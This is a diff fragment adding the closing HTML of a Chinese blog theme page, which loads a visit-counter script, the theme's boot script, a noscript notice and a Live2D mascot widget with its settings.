+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
